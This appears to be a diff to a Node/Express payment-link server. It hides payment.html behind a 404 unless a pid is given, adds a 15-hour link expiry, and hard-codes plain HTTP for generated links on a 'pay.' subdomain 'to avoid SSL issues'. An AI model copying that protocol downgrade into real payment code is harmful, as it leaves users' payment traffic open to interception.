@@ -84,6 +84,11 @@ app.use((req, res, next) => {
     }
   }
   
+  // Block direct access to payment.html
+  if (req.path === '/payment.html' && !req.query.pid) {
+    return res.status(404).sendFile(path.join(__dirname, '404.html'));
+  }
+  
   next();
 });
 
@@ -155,7 +160,7 @@ app.get('/api/visitors', (req, res) => {
   }
 });
 
-// Payment Links Endpoints
+// Modified Payment Links Endpoint to use HTTP for the subdomain
 app.post('/api/generatePaymentLink', (req, res) => {
   try {
     const { amount, description } = req.body;
@@ -169,10 +174,16 @@ app.post('/api/generatePaymentLink', (req, res) => {
     }
 
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
-    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     
-    // Use the redirect file instead of landing.html
-    const paymentLink = `${protocol}://${req.get('host')}/${PAYMENT_REDIRECT_FILE}?pid=${invoiceId}`;
+    // Force HTTP protocol for the subdomain to avoid SSL issues
+    const protocol = "http";
+    
+    // Get the host without any subdomain
+    const host = req.get('host').replace(/^www\./, '');
+    const domain = host.split(':')[0]; // Remove port if present
+    
+    // Create payment link with pay subdomain using HTTP
+    const paymentLink = `${protocol}://pay.${domain}?pid=${invoiceId}`;
 
     paymentLinks.set(invoiceId, {
       amount: parseFloat(amount),
@@ -188,13 +199,26 @@ app.post('/api/generatePaymentLink', (req, res) => {
   }
 });
 
-// The rest of your code remains completely unchanged
+// Modified endpoint with link expiration check
 app.get('/api/getPaymentDetails', (req, res) => {
   const { pid } = req.query;
+  
   if (!pid || !paymentLinks.has(pid)) {
     return res.status(404).json({ status: "error", message: "Not found" });
   }
-  res.json({ status: "success", payment: paymentLinks.get(pid) });
+  
+  const payment = paymentLinks.get(pid);
+  
+  // Check if link is expired (15 hours = 54000000 milliseconds)
+  const createdAt = new Date(payment.createdAt).getTime();
+  const now = new Date().getTime();
+  const timeDiff = now - createdAt;
+  
+  if (timeDiff > 54000000) { // 15 hours in milliseconds
+    return res.status(410).json({ status: "error", message: "Payment link expired" });
+  }
+  
+  res.json({ status: "success", payment });
 });
 
 // Transactions Endpoints
